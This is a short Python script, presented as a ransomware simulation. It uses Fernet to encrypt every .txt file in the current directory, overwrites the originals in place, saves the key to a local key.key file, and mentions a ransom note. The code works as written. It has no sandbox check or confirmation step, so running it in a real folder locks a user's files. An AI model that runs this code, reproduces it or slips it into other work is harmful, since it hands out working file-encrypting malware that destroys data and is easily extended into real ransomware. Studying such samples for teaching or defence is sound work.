import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

print("[!] Simulating ransomware attack...")

for file in os.listdir():
    if file.endswith(".txt"):
        with open(file, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file, "wb") as f:
            f.write(encrypted)
        print(f"[LOCKED] {file}")

with open("key.key", "wb") as key_file:
    key_file.write(key)

print("[!] Files encrypted. Ransom note would be shown here.")
